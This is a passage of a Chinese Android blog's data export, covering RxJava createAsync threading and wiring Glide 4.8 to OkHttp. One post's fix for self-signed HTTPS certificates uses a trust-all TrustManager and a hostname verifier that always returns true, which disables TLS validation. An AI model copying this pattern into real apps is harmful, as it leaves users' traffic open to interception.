-&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">DataClass</span> <span class=\"variable\">remoteData</span> <span class=\"operator\">=</span> dataResponse;</span><br><span class=\"line\">            <span class=\"comment\">// 假装对返回数据做了一些处理</span></span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> remoteData;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        .observeOn(AndroidSchedulers.mainThread()); <span class=\"comment\">// 在UI线程中暗中观察并及时消费</span></span><br></pre></td></tr></table></figure>\n\n<p>按照上面的意思，这里<strong>createAsync</strong>已经会为你指定异步线程了，你就无需在外部再去调用**subscribeOn(Schedulers.io())**，所以把这句去掉。<br><strong>注意：</strong> 这两步改动是一起的，缺一不可。<br>如此一来，就能避免这方面带来的内存溢出问题了。所以这也给我们提了个醒，Schedulers.io()不要随便用，它只适合做一些轻量的异步工作，不要试图用它支撑高并发。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>针对这个问题，我特意去看了看createAsync方法的源码注释：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Returns an instance which creates asynchronous observables. Applying</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> Observable#subscribeOn&#125; has no effect on stream types created by this factory.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> RxJava2CallAdapterFactory <span class=\"title function_\">createAsync</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RxJava2CallAdapterFactory</span>(<span class=\"literal\">null</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>没错，它专门提到：subscribeOn方法对createAsync最终构造出来的Observeable是没有影响的，也就是说，只要你用了createAsync，即便后续再调用subscribeOn(Schedulers.io())，都没什么用处，并不会作用到网络请求。一直到你调用observeOn之前（包括map等操作），线程都不会切换。</p>\n<p><strong>调料包：</strong> 关于RxJava的线程切换及操作符作用域，看看这篇应该就够了：<a href=\"https://www.jianshu.com/p/59c3d6bb6a6b\">https://www.jianshu.com/p/59c3d6bb6a6b</a></p>\n"},{"layout":"post","title":"Glide4.8集成现有OkHttpClient并加载https图片","subtitle":"知名库之间的故事。","date":"2018-12-17T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n转眼间谷歌的Glide图片加载库都4.8.0了，时间过得真的太快。\n**今天解决两个问题（第1个是独立问题，第2个依赖第1个）：**\n1、Glide网络加载库（其默认为原生的API实现）集成为OkHttp，众所周知OkHttp可以帮助我们更方便地玩转网络请求；\n2、让Glide可以加载https前缀的图片链接（如果你的域名证书是服务端自己瞎签的，没有认证，就过不了安全检查，表现为你用Chrome浏览器打开这个链接会提示不安全的红色警告）。\n\n#### 问题1：集成OkHttp\n\n一般来说我们项目一开始会分别使用Glide和OkHttp库，没特殊需求时没想到过它们还要结合。\n首先，假设我们已经有OkHttpClient的初始化逻辑了：\n\n```java\n// 简化示意的初始化代码\npublic static OkHttpClient getHttpClient() {\n    OkHttpClient.Builder builder = new OkHttpClient.Builder()\n            .connectTimeout(10, TimeUnit.SECONDS)\n            .addInterceptor(...)\n            .cache(...)；\n    return builder.build();\n}\n```\n\n然后我们配置一下必要的依赖库，在app的gradle文件中：\n\n```\ndependencies {\n    implementation 'com.squareup.okhttp3:okhttp:3.11.0'\n    ...\n    implementation 'com.github.bumptech.glide:glide:4.8.0'\n    implementation 'com.github.bumptech.glide:okhttp3-integration:4.8.0' // 新增\n    implementation 'com.github.bumptech.glide:annotations:4.8.0' // 新增\n    annotationProcessor 'com.github.bumptech.glide:compiler:4.8.0'\n}\n```\n\n由于我还使用了Retrofit配合OKHttp，这里就省略了哈，主要关注Glide相关的库（**集成和注解**）。\n如果用到了混淆，记得配置一下Proguard：\n\n```\n# For Glide ---->\n-keep public class * implements com.bumptech.glide.module.GlideModule\n-keep public class * extends com.bumptech.glide.module.AppGlideModule\n-keep public enum com.bumptech.glide.load.ImageHeaderParser$** {\n  **[] $VALUES;\n  public *;\n}\n```\n\n配置完了记得Sync一下项目，接着新建一个AppGlideModule的子类，用我们现有的HttpClient来替换Glide的，很简单，这里把import的包也指明，方便对照：\n\n```java\nimport android.content.Context;\nimport android.support.annotation.NonNull;\n\nimport com.bumptech.glide.Glide;\nimport com.bumptech.glide.Registry;\nimport com.bumptech.glide.annotation.GlideModule;\nimport com.bumptech.glide.integration.okhttp3.OkHttpUrlLoader;\nimport com.bumptech.glide.load.model.GlideUrl;\nimport com.bumptech.glide.module.AppGlideModule;\n\nimport java.io.InputStream;\n\n// 注意这个注解一定要加上，HttpGlideModule是自定义的名字\n@GlideModule\npublic final class HttpGlideModule extends AppGlideModule {\n\n    @Override\n    public void registerComponents(@NonNull Context context, @NonNull Glide glide, @NonNull Registry registry) {\n        // 注意这里用我们刚才现有的Client实例传入即可\n        registry.replace(GlideUrl.class, InputStream.class, new OkHttpUrlLoader.Factory(XXX.getHttpClient()));\n    }\n}\n```\n\nOK，现在再用Glide去加载图片，就是走的OkHttpClient了，可以添加log拦截器去看，这里就不赘述了。\n\n#### 问题2：忽略安全证书加载https图片\n\n主要是通过给OkHttp增加SSL和验证器配置来实现忽略安全认证，即便是自己签名证书的https域名也可以加载了。\n先定义好SSLSocketFactory和HostnameVerifier：\n\n```java\n/**\n * getSSLSocketFactory、getTrustManagers、getHostnameVerifier\n * 使OkHttpClient支持自签名证书，避免Glide加载不了Https图片\n */\nprivate static SSLSocketFactory getSSLSocketFactory() {\n    try {\n        SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n        sslContext.init(null, getTrustManagers(), new SecureRandom());\n        return sslContext.getSocketFactory();\n    } catch (Exception e) {\n        throw new RuntimeException(e);\n    }\n}\n\nprivate static TrustManager[] getTrustManagers() {\n    return new TrustManager[]{new X509TrustManager() {\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n    }};\n}\n\nprivate static HostnameVerifier getHostnameVerifier() {\n    return new HostnameVerifier() {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true; // 直接返回true，默认verify通过\n        }\n    };\n}\n```\n\n最后回到最开始的初始化OkHttp代码，添加：\n\n```java\n// 简化示意的初始化代码\npublic static OkHttpClient getHttpClient() {\n    OkHttpClient.Builder builder = new OkHttpClient.Builder()\n            ...\n            .sslSocketFactory(getSSLSocketFactory())\n            .hostnameVerifier(getHostnameVerifier())；\n    return builder.build();\n}\n```\n\n大功告成了，虽然这样不是很安全的做法，但对于一些小项目或者测试环境来说，这能避免证书带来的无法加载网络图片的额外问题。\n","source":"_posts/2018-12-18-Glide4.8集成现有OkHttpClient并加载https图片.md","raw":"---\nlayout:     post\ntitle:      Glide4.8集成现有OkHttpClient并加载https图片\nsubtitle:   知名库之间的故事。\ndate:       2018-12-18\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n转眼间谷歌的Glide图片加载库都4.8.0了，时间过得真的太快。\n**今天解决两个问题（第1个是独立问题，第2个依赖第1个）：**\n1、Glide网络加载库（其默认为原生的API实现）集成为OkHttp，众所周知OkHttp可以帮助我们更方便地玩转网络请求；\n2、让Glide可以加载https前缀的图片链接（如果你的域名证书是服务端自己瞎签的，没有认证，就过不了安全检查，表现为你用Chrome浏览器打开这个链接会提示不安全的红色警告）。\n\n#### 问题1：集成OkHttp\n\n一般来说我们项目一开始会分别使用Glide和OkHttp库，没特殊需求时没想到过它们还要结合。\n首先，假设我们已经有OkHttpClient的初始化逻辑了：\n\n```java\n// 简化示意的初始化代码\npublic static OkHttpClient getHttpClient() {\n    OkHttpClient.Builder builder = new OkHttpClient.Builder()\n            .connectTimeout(10, TimeUnit.SECONDS)\n            .addInterceptor(...)\n            .cache(...)；\n    return builder.build();\n}\n```\n\n然后我们配置一下必要的依赖库，在app的gradle文件中：\n\n```\ndependencies {\n    implementation 'com.squareup.okhttp3:okhttp:3.11.0'\n    ...\n    implementation 'com.github.bumptech.glide:glide:4.8.0'\n    implementation 'com.github.bumptech.glide:okhttp3-integration:4.8.0' // 新增\n    implementation 'com.github.bumptech.glide:annotations:4.8.0' // 新增\n    annotationProcessor 'com.github.bumptech.glide:compiler:4.8.0'\n}\n```\n\n由于我还使用了Retrofit配合OKHttp，这里就省略了哈，主要关注Glide相关的库（**集成和注解**）。\n如果用到了混淆，记得配置一下Proguard：\n\n```\n# For Glide ---->\n-keep public class * implements com.bumptech.glide.module.GlideModule\n-keep public class * extends com.bumptech.glide.module.AppGlideModule\n-keep public enum com.bumptech.glide.load.ImageHeaderParser$** {\n  **[] $VALUES;\n  public *;\n}\n```\n\n配置完了记得Sync一下项目，接着新建一个AppGlideModule的子类，用我们现有的HttpClient来替换Glide的，很简单，这里把import的包也指明，方便对照：\n\n```java\nimport android.content.Context;\nimport android.support.annotation.NonNull;\n\nimport com.bumptech.glide.Glide;\nimport com.bumptech.glide.Registry;\nimport com.bumptech.glide.annotation.GlideModule;\nimport com.bumptech.glide.integration.okhttp3.OkHttpUrlLoader;\nimport com.bumptech.glide.load.model.GlideUrl;\nimport com.bumptech.glide.module.AppGlideModule;\n\nimport java.io.InputStream;\n\n// 注意这个注解一定要加上，HttpGlideModule是自定义的名字\n@GlideModule\npublic final class HttpGlideModule extends AppGlideModule {\n\n    @Override\n    public void registerComponents(@NonNull Context context, @NonNull Glide glide, @NonNull Registry registry) {\n        // 注意这里用我们刚才现有的Client实例传入即可\n        registry.replace(GlideUrl.class, InputStream.class, new OkHttpUrlLoader.Factory(XXX.getHttpClient()));\n    }\n}\n```\n\nOK，现在再用Glide去加载图片，就是走的OkHttpClient了，可以添加log拦截器去看，这里就不赘述了。\n\n#### 问题2：忽略安全证书加载https图片\n\n主要是通过给OkHttp增加SSL和验证器配置来实现忽略安全认证，即便是自己签名证书的https域名也可以加载了。\n先定义好SSLSocketFactory和HostnameVerifier：\n\n```java\n/**\n * getSSLSocketFactory、getTrustManagers、getHostnameVerifier\n * 使OkHttpClient支持自签名证书，避免Glide加载不了Https图片\n */\nprivate static SSLSocketFactory getSSLSocketFactory() {\n    try {\n        SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n        sslContext.init(null, getTrustManagers(), new SecureRandom());\n        return sslContext.getSocketFactory();\n    } catch (Exception e) {\n        throw new RuntimeException(e);\n    }\n}\n\nprivate static TrustManager[] getTrustManagers() {\n    return new TrustManager[]{new X509TrustManager() {\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n    }};\n}\n\nprivate static HostnameVerifier getHostnameVerifier() {\n    return new HostnameVerifier() {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true; // 直接返回true，默认verify通过\n        }\n    };\n}\n```\n\n最后回到最开始的初始化OkHttp代码，添加：\n\n```java\n// 简化示意的初始化代码\npublic static OkHttpClient getHttpClient() {\n    OkHttpClient.Builder builder = new OkHttpClient.Builder()\n            ...\n            .sslSocketFactory(getSSLSocketFactory())\n            .hostnameVerifier(getHostnameVerifier())；\n    return builder.build();\n}\n```\n\n大功告成了，虽然这样不是很安全的做法，但对于一些小项目或者测试环境来说，这能避免证书带来的无法加载网络图片的额外问题。\n","slug":"Glide4.8集成现有OkHttpClient并加载https图片","published":1,"updated":"2024-03-25T07:31:25.852Z","comments":1,"photos":[],"link":"","_id":"cluaufh0f000dthe6am6e85vd","content":"<p>转眼间谷歌的Glide图片加载库都4.8.0了，时间过得真的太快。<br><strong>今天解决两个问题（第1个是独立问题，第2个依赖第1个）：</strong><br>1、Glide网络加载库（其默认为原生的API实现）集成为OkHttp，众所周知OkHttp可以帮助我们更方便地玩转网络请求；<br>2、让Glide可以加载https前缀的图片链接（如果你的域名证书是服务端自己瞎签的，没有认证，就过不了安全检查，表现为你用Chrome浏览器打开这个链接会提示不安全的红色警告）。</p>\n<h4 id=\"问题1：集成OkHttp\"><a href=\"#问题1：集成OkHttp\" class=\"headerlink\" title=\"问题1：集成OkHttp\"></a>问题1：集成OkHttp</h4><p>一般来说我们项目一开始会分别使用Glide和OkHttp库，没特殊需求时没想到过它们还要结合。<br>首先，假设我们已经有OkHttpClient的初始化逻辑了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 简化示意的初始化代码</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> OkHttpClient <span class=\"title function_\">getHttpClient</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    OkHttpClient.<span class=\"type\">Builder</span> <span class=\"variable\">builder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">            .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">            .addInterceptor(...)</span><br><span class=\"line\">            .cache(...)；</span><br><span class=\"line\">    <span class=\"keyword\">return</span> builder.build();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们配置一下必要的依赖库，在app的gradle文件中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">    implementation &#x27;com.squareup.okhttp3:okhttp:3.11.0&#x27;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    implementation &#x27;com.github.bumptech.glide:glide:4.8.0&#x27;</span><br><span class=\"line\">    implementation &#x27;com.github.bumptech.glide:okhttp3-integration:4.8.0&#x27; // 新增</span><br><span class=\"line\">    implementation &#x27;com.github.bumptech.glide:annotations:4.8.0&#x27; // 新增</span><br><span class=\"line\">    annotationProcessor &#x27;com.github.bumptech.glide:compiler:4.8.0&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于我还使用了Retrofit配合OKHttp，这里就省略了哈，主要关注Glide相关的库（<strong>集成和注解</strong>）。<br>如果用到了混淆，记得配置一下Proguard：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># For Glide ----&gt;</span><br><span class=\"line\">-keep public class * implements com.bumptech.glide.module.GlideModule</span><br><span class=\"line\">-keep public class * extends com.bumptech.glide.module.AppGlideModule</span><br><span class=\"line\">-keep public enum com.bumptech.glide.load.ImageHeaderParser$** &#123;</span><br><span class=\"line\">  **[] $VALUES;</span><br><span class=\"line\">  public *;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>配置完了记得Sync一下项目，接着新建一个AppGlideModule的子类，用我们现有的HttpClient来替换Glide的，很简单，这里把import的包也指明，方便对照：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> android.content.Context;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.support.annotation.NonNull;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.Glide;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.Registry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.annotation.GlideModule;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.integration.okhttp3.OkHttpUrlLoader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.load.model.GlideUrl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.bumptech.glide.<span class=\"keyword\">module</span>.AppGlideModule;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 注意这个注解一定要加上，HttpGlideModule是自定义的名字</span></span><br><span class=\"line\"><span class=\"meta\">@GlideModule</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">HttpGlideModule</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppGlideModule</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">registerComponents</span><span class=\"params\">(<span class=\"meta\">@NonNull</span> Context context, <span class=\"meta\">@NonNull</span> Glide glide, <span class=\"meta\">@NonNull</span> Registry registry)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 注意这里用我们刚才现有的Client实例传入即可</span></span><br><span class=\"line\">        registry.replace(GlideUrl.class, InputStream.class, <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpUrlLoader</span>.Factory(XXX.getHttpClient()));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>OK，现在再用Glide去加载图片，就是走的OkHttpClient了，可以添加log拦截器去看，这里就不赘述了。</p>\n<h4 id=\"问题2：忽略安全证书加载https图片\"><a href=\"#问题2：忽略安全证书加载https图片\" class=\"headerlink\" title=\"问题2：忽略安全证书加载https图片\"></a>问题2：忽略安全证书加载https图片</h4><p>主要是通过给OkHttp增加SSL和验证器配置来实现忽略安全认证，即便是自己签名证书的https域名也可以加载了。<br>先定义好SSLSocketFactory和HostnameVerifier：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * getSSLSocketFactory、getTrustManagers、getHostnameVerifier</span></span><br><span class=\"line\"><span class=\"comment\"> * 使OkHttpClient支持自签名证书，避免Glide加载不了Https图片</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> SSLSocketFactory <span class=\"title function_\">getSSLSocketFactory</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">SSLContext</span> <span class=\"variable\">sslContext</span> <span class=\"operator\">=</span> SSLContext.getInstance(<span class=\"string\">&quot;SSL&quot;</span>);</span><br><span class=\"line\">        sslContext.init(<span class=\"literal\">null</span>, getTrustManagers(), <span class=\"keyword\">new</span> <span class=\"title class_\">SecureRandom</span>());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sslContext.getSocketFactory();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> TrustManager[] getTrustManagers() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TrustManager</span>[]&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">X509TrustManager</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkClientTrusted</span><span class=\"params\">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkServerTrusted</span><span class=\"params\">(X509Certificate[] chain, String authType)</span> &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">X509Certificate</span>[]&#123;&#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> HostnameVerifier <span class=\"title function_\">getHostnameVerifier</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HostnameVerifier</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">verify</span><span class=\"params\">(String hostname, SSLSession session)</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>; <span class=\"comment\">// 直接返回true，默认verify通过</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后回到最开始的初始化OkHttp代码，添加：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 简化示意的初始化代码</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> OkHttpClient <span class=\"title function_\">getHttpClient</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    OkHttpClient.<span class=\"type\">Builder</span> <span class=\"variable\">builder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            .sslSocketFactory(getSSLSocketFactory())</span><br><span class=\"line\">            .hostnameVerifier(getHostnameVerifier())；</span><br><span class=\"line\">    <span class=\"keyword\">return</span> builder.build();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>大功告成了，虽然这样不是很安全的做法，但对于一些小项目或者测试环境来说，这能避免证书带来的无法加载网络图片的额外问题。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p>转眼间谷歌的Glide图片加载库都4.8.0了，时间过得真的太快。<br><strong>今天解决两个问题（第1个是独立问题，第2个依赖第1个）：</strong><br>1、Glide网络加载库（其默认为原生的API实现）集成为OkHttp，众所周知OkHttp可以帮助我们更方便地玩转网络请求；<br>2、让Glide可以加载https前缀的图片链接（如果你的域名证书是服务端自己瞎签的，没有认证，就过不了安全检查，表现为你用Chrome浏览器打开这个链接会提示不安全的红色警告）。</p>\n<h4 id=\"问题1：集成OkHttp\"><a href=\"#问题1：集成OkHttp\" class=\"headerlink\" title=\"问题1：集成OkHttp\"></a>问题1：集成OkHttp</h4><p>一般来说我们项目一开始会分别使用Glide和OkHttp库，没特殊需求时没想到过它们还要结合。<br>首先，假设我们已经有OkHttpClient的初始化逻辑了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 简化示意的初始化代码</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> OkHttpClient <span class=\"title function_\">getHttpClient</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    OkHttpClient.<span class=\"type\">Builder</span> <span class=\"variable\">builder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">OkHttpClient</span>.Builder()</span><br><span class=\"line\">            .connectTimeout(<span class=\"number\">10</span>, TimeUnit.SECONDS)</span><br><span class=\"line\">            .addInterceptor(...)</span><br><span class=\"line\">            .cache(...)；</span><br><span class=\"line\">    <span class=\"keyword\">return</span> builder.build();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们配置一下必要的依赖库，在app的gradle文件中：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dependencies &#123;</span><br><span class=\"line\">    implementation &#x27;com.squareup.okhttp3:okhttp:3.11.0&#x27;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    implementation &#x27;com.github.bumptech.glide:glide:4.8.0&#x27;</span><br><span class=\"line\">    implementation &#x27;com.github.bumptech.glide:okhttp3-integration:4.8.0&#x27; // 新增</span><br><span class=\"line\">    implementation &#x27;com.github.bumptech.glide:annotations:4.8.0&#x27; // 新增</span><br><span class=\"line\">    annotationProcessor &#x27;com.github.bumptech.glide:compiler:4.8.0&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于我还使用了Retrofit配合OKHttp，这里就省略了哈，主要关注Glide相关的库（<strong>集成和注解</strong>）。<br>如果用到了混淆，记得配置一下Proguard：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># For Glide ----&gt;</span><br><span class=\"line\">-keep public class * implements 